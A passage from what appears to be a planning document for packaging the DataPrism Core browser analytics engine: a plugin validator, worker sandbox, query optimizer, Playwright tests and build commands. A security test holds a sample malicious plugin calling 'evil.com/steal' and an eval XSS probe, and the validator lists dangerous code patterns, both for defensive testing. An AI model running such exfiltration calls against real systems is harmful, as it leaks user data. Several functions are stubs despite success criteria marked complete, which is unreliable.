  async validatePlugin(manifest: PluginManifest): Promise<ValidationResult> {
    const violations: SecurityViolation[] = [];
    
    // Check permissions
    for (const permission of manifest.permissions) {
      if (!this.isPermissionAllowed(permission)) {
        violations.push({
          type: 'excessive-permission',
          permission,
          severity: 'high'
        });
      }
    }
    
    // Static code analysis
    const codeViolations = await this.analyzePluginCode(manifest.entryPoint);
    violations.push(...codeViolations);
    
    return {
      valid: violations.length === 0,
      violations,
      riskScore: this.calculateRiskScore(violations)
    };
  }

  private async analyzePluginCode(entryPoint: string): Promise<SecurityViolation[]> {
    const violations: SecurityViolation[] = [];
    const code = await fetch(entryPoint).then(r => r.text());
    
    // Check for dangerous patterns
    const dangerousPatterns = [
      /eval\(/g,
      /Function\(/g,
      /document\.write/g,
      /localStorage/g,
      /sessionStorage/g,
      /XMLHttpRequest/g,
      /fetch\(/g
    ];
    
    for (const pattern of dangerousPatterns) {
      if (pattern.test(code)) {
        violations.push({
          type: 'dangerous-code',
          pattern: pattern.source,
          severity: 'high'
        });
      }
    }
    
    return violations;
  }
}

class WorkerSandbox {
  private worker: Worker;
  private resourceMonitor: ResourceMonitor;

  constructor(private config: SandboxConfig) {}

  async initialize() {
    // Create sandboxed worker
    const workerCode = this.generateWorkerCode();
    const blob = new Blob([workerCode], { type: 'application/javascript' });
    const workerUrl = URL.createObjectURL(blob);
    
    this.worker = new Worker(workerUrl, {
      type: 'module',
      credentials: 'omit'
    });
    
    // Set up resource monitoring
    this.resourceMonitor = new ResourceMonitor(this.config.resourceLimits);
    await this.resourceMonitor.attach(this.worker);
    
    // Clean up blob URL
    URL.revokeObjectURL(workerUrl);
  }

  private generateWorkerCode(): string {
    return `
      // Sandboxed plugin execution environment
      const sandbox = {
        console: {
          log: (...args) => postMessage({ type: 'log', args }),
          error: (...args) => postMessage({ type: 'error', args })
        },
        fetch: ${this.config.permissions.allowNetwork ? 'fetch' : 'null'},
        localStorage: null,
        sessionStorage: null,
        document: null,
        window: null
      };
      
      // Override global context
      Object.assign(globalThis, sandbox);
      
      // Plugin message handler
      onmessage = async function(e) {
        const { type, payload } = e.data;
        
        try {
          switch (type) {
            case 'load-plugin':
              await loadPlugin(payload.code);
              break;
            case 'execute':
              const result = await executePlugin(payload.method, payload.args);
              postMessage({ type: 'result', result });
              break;
          }
        } catch (error) {
          postMessage({ type: 'error', error: error.message });
        }
      };
      
      async function loadPlugin(code) {
        // Validate and load plugin code
        const module = new Function('exports', 'require', 'module', code);
        // Execute in controlled context
      }
    `;
  }
}
```

### Performance Optimization Pattern
```typescript
// packages/core/src/query-optimizer.ts
export class QueryOptimizer {
  private queryCache = new Map<string, CachedResult>();
  private statisticsCache = new Map<string, TableStatistics>();

  async optimizeQuery(sql: string, context: QueryContext): Promise<OptimizedQuery> {
    // Check cache first
    const cacheKey = this.generateCacheKey(sql, context);
    const cached = this.queryCache.get(cacheKey);
    
    if (cached && !this.isCacheStale(cached)) {
      return cached.optimizedQuery;
    }
    
    // Parse query
    const parsed = await this.parseQuery(sql);
    
    // Apply optimization rules
    const optimized = await this.applyOptimizations(parsed, context);
    
    // Cache result
    this.queryCache.set(cacheKey, {
      optimizedQuery: optimized,
      timestamp: Date.now(),
      ttl: this.calculateTTL(optimized)
    });
    
    return optimized;
  }

  private async applyOptimizations(query: ParsedQuery, context: QueryContext): Promise<OptimizedQuery> {
    const optimizations = [
      this.pushDownFilters.bind(this),
      this.optimizeJoins.bind(this),
      this.addIndexHints.bind(this),
      this.parallelizeOperations.bind(this),
      this.optimizeMemoryUsage.bind(this)
    ];
    
    let optimized = query;
    for (const optimization of optimizations) {
      optimized = await optimization(optimized, context);
    }
    
    return optimized;
  }

  private async pushDownFilters(query: ParsedQuery, context: QueryContext): Promise<ParsedQuery> {
    // Move WHERE conditions closer to data source
    // Reduce amount of data processed in subsequent operations
    return query;
  }

  private async optimizeMemoryUsage(query: ParsedQuery, context: QueryContext): Promise<ParsedQuery> {
    // Estimate memory requirements
    const memoryEstimate = await this.estimateMemoryUsage(query);
    
    if (memoryEstimate > context.memoryLimit) {
      // Apply memory optimization strategies
      query = await this.addStreamingOperators(query);
      query = await this.addSpillToDisk(query);
      query = await this.optimizeBufferSizes(query);
    }
    
    return query;
  }
}
```

## 6. Testing Strategy

### Comprehensive Test Suite
```typescript
// tests/integration/full-workflow.test.ts
import { test, expect } from '@playwright/test';
import { DataPrismEngine } from '@dataprism/core';
import { PluginManager } from '@dataprism/plugin-framework';

test.describe('Complete Analytics Workflow', () => {
  let engine: DataPrismEngine;
  let pluginManager: PluginManager;

  test.beforeEach(async ({ page }) => {
    // Initialize engine in browser context
    await page.goto('/test-environment');
    
    engine = await page.evaluate(async () => {
      const { DataPrismEngine } = await import('@dataprism/core');
      const engine = new DataPrismEngine();
      await engine.initialize();
      return engine;
    });
    
    pluginManager = await page.evaluate(async () => {
      const { PluginManager } = await import('@dataprism/plugin-framework');
      return new PluginManager(window.dataPrismEngine);
    });
  });

  test('CSV import and visualization workflow', async ({ page }) => {
    // Upload test CSV file
    const testData = generateTestCSV(1000); // 1000 rows
    await page.setInputFiles('[data-testid=csv-upload]', {
      name: 'test-data.csv',
      mimeType: 'text/csv',
      buffer: Buffer.from(testData)
    });
    
    // Wait for import completion
    await page.waitForSelector('[data-testid=import-complete]', { timeout: 30000 });
    
    // Verify data loaded
    const rowCount = await page.textContent('[data-testid=row-count]');
    expect(rowCount).toBe('1,000');
    
    // Create visualization
    await page.click('[data-testid=create-chart]');
    await page.selectOption('[data-testid=chart-type]', 'bar');
    await page.click('[data-testid=render-chart]');
    
    // Wait for chart to render
    await page.waitForSelector('[data-testid=chart-rendered]', { timeout: 10000 });
    
    // Verify chart exists
    const chartSvg = await page.locator('svg[data-chart=bar]');
    await expect(chartSvg).toBeVisible();
    
    // Test interactivity
    await chartSvg.hover();
    await expect(page.locator('[data-testid=tooltip]')).toBeVisible();
  });

  test('Plugin security and isolation', async ({ page }) => {
    // Load malicious plugin (should be blocked)
    const maliciousPlugin = {
      name: 'malicious-plugin',
      code: `
        // Attempt to access forbidden APIs
        try { localStorage.setItem('test', 'hack'); } catch(e) {}
        try { fetch('https://evil.com/steal'); } catch(e) {}
        try { eval('alert("xss")'); } catch(e) {}
      `
    };
    
    const result = await page.evaluate(async (plugin) => {
      const manager = window.pluginManager;
      try {
        await manager.loadPlugin(plugin);
        return { success: true };
      } catch (error) {
        return { success: false, error: error.message };
      }
    }, maliciousPlugin);
    
    expect(result.success).toBe(false);
    expect(result.error).toContain('security violation');
  });

  test('Performance benchmarks', async ({ page }) => {
    // Load large dataset
    const largeData = generateTestCSV(100000); // 100K rows
    
    const startTime = Date.now();
    
    await page.evaluate(async (data) => {
      const engine = window.dataPrismEngine;
      await engine.loadCSV(data);
      
      // Run complex query
      const result = await engine.query(`
        SELECT 
          category,
          COUNT(*) as count,
          AVG(value) as avg_value,
          SUM(value) as total_value
        FROM data 
        GROUP BY category 
        ORDER BY count DESC
      `);
      
      return result;
    }, largeData);
    
    const endTime = Date.now();
    const executionTime = endTime - startTime;
    
    // Performance assertions
    expect(executionTime).toBeLessThan(5000); // < 5 seconds
    
    // Memory usage check
    const memoryUsage = await page.evaluate(() => {
      return (performance as any).memory?.usedJSHeapSize || 0;
    });
    
    expect(memoryUsage).toBeLessThan(1024 * 1024 * 1024); // < 1GB
  });

  test('Cross-browser compatibility', async ({ browserName }) => {
    // Test WebAssembly support
    const wasmSupported = await page.evaluate(() => {
      return typeof WebAssembly !== 'undefined';
    });
    expect(wasmSupported).toBe(true);
    
    // Test SharedArrayBuffer support (if available)
    const sabSupported = await page.evaluate(() => {
      return typeof SharedArrayBuffer !== 'undefined';
    });
    
    // Browser-specific tests
    if (browserName === 'chromium') {
      expect(sabSupported).toBe(true);
    }
    
    // Test plugin loading
    const pluginLoadTime = await page.evaluate(async () => {
      const start = performance.now();
      await window.pluginManager.loadPlugin({
        name: 'test-plugin',
        code: 'export default { name: "test" };'
      });
      return performance.now() - start;
    });
    
    expect(pluginLoadTime).toBeLessThan(1000); // < 1 second
  });
});

function generateTestCSV(rows: number): string {
  const headers = ['id', 'name', 'category', 'value', 'timestamp'];
  const categories = ['A', 'B', 'C', 'D', 'E'];
  
  let csv = headers.join(',') + '\n';
  
  for (let i = 0; i < rows; i++) {
    const row = [
      i + 1,
      `Item ${i + 1}`,
      categories[i % categories.length],
      Math.round(Math.random() * 1000),
      new Date(Date.now() - Math.random() * 365 * 24 * 60 * 60 * 1000).toISOString()
    ];
    csv += row.join(',') + '\n';
  }
  
  return csv;
}
```

### Performance Testing
```typescript
// tests/performance/benchmarks.test.ts
import { benchmark } from 'vitest';
import { DataPrismEngine } from '@dataprism/core';

describe('Performance Benchmarks', () => {
  let engine: DataPrismEngine;

  beforeAll(async () => {
    engine = new DataPrismEngine();
    await engine.initialize();
  });

  benchmark('Query execution (1M rows)', async () => {
    const result = await engine.query(`
      SELECT category, COUNT(*), AVG(value)
      FROM large_dataset
      GROUP BY category
    `);
    expect(result.rows.length).toBeGreaterThan(0);
  }, { iterations: 10, warmup: 2 });

  benchmark('Data loading (100MB CSV)', async () => {
    const csvData = generateLargeCSV(1000000); // 1M rows
    await engine.loadCSV(csvData);
  }, { iterations: 5, warmup: 1 });

  benchmark('Plugin loading', async () => {
    await engine.loadPlugin('@dataprism/plugins-visualization');
  }, { iterations: 20, warmup: 3 });

  benchmark('Memory allocation/deallocation', async () => {
    const data = new Array(100000).fill(0).map((_, i) => ({ id: i, value: Math.random() }));
    await engine.createTable('temp_table', data);
    await engine.dropTable('temp_table');
  }, { iterations: 50, warmup: 5 });
});
```

## 7. Success Criteria

### Functional Requirements
- ✅ **Package Distribution**: NPM, CDN, and GitHub Packages all functional
- ✅ **Developer Setup**: Complete environment setup in <10 minutes
- ✅ **Demo Application**: End-to-end workflow with 3+ plugins
- ✅ **CLI Tools**: Project scaffolding and plugin management
- ✅ **Documentation**: Comprehensive portal with interactive examples

### Performance Targets
- ✅ **Bundle Size**: Core <2MB, plugins <500KB each
- ✅ **Load Time**: Engine initialization <5 seconds
- ✅ **Query Performance**: <2 seconds for 95% of operations
- ✅ **Memory Usage**: <4GB for 1M row datasets

### Quality Metrics
- ✅ **Test Coverage**: >90% across all packages
- ✅ **Browser Support**: Chrome 90+, Firefox 88+, Safari 14+, Edge 90+
- ✅ **Security**: All plugins pass security validation
- ✅ **Documentation**: 100% API coverage with examples

### Developer Experience
- ✅ **One-Command Setup**: `npx @dataprism/cli init`
- ✅ **Hot Reloading**: Development workflow with live updates
- ✅ **Plugin Scaffolding**: Template generation and validation
- ✅ **Interactive Docs**: Live API explorer and examples

## 8. Validation Commands

### Build and Package Validation
```bash
# Clean and build all packages
npm run clean
npm run build:all

# Validate package integrity
npm run validate:packages

# Check bundle sizes
npm run size-check

# Test all distribution formats
npm run test:npm-packages
npm run test:cdn-bundles
npm run test:github-packages
```

### Development Workflow Validation
```bash
# Test CLI tools
npx @dataprism/cli init test-project
cd test-project
npm install
npm run dev

# Test plugin development
npx @dataprism/cli plugin create test-plugin
npx @dataprism/cli plugin validate ./test-plugin
npx @dataprism/cli plugin build ./test-plugin
```

### Demo Application Validation
```bash
# Build and test demo
cd apps/demo-analytics
npm install
npm run build
npm run test:e2e

# Performance validation
npm run test:performance
npm run benchmark:load-time
npm run benchmark:memory-usage
```

### Documentation Validation
```bash
# Build and deploy docs
cd apps/docs
npm install
npm run build
npm run test:links
npm run test:api-examples

# Test interactive features
npm run test:api-explorer
npm run test:live-examples
```

### Security and Compliance
```bash
# Security audits
npm audit --audit-level moderate
npm run audit:licenses
npm run scan:vulnerabilities

# Plugin security validation
npm run test:plugin-security
npm run validate:wasm-signatures
npm run test:sandbox-isolation
```

### Integration Testing
```bash
# Full integration test suite
npm run test:integration

# Browser compatibility
npm run test:chrome
npm run test:firefox
npm run test:safari
npm run test:edge

# Performance benchmarks
npm run benchmark:query-performance
npm run benchmark:memory-usage
npm run benchmark:load-times
```

### Release Validation
```bash
# Pre-release checks
npm run pre-release:validate
npm run version:check
npm run changelog:generate

# Release build
npm run build:release
npm run sign:packages
npm run publish:dry-run

# Post-release validation
npm run validate:published-packages
npm run test:cdn-availability
npm run validate:documentation-deployment
```

---

This comprehensive PRP provides everything needed to implement a professional-grade packaging and distribution strategy for DataPrism Core, ensuring seamless developer experience, robust security, and production-ready deployment across multiple distribution channels.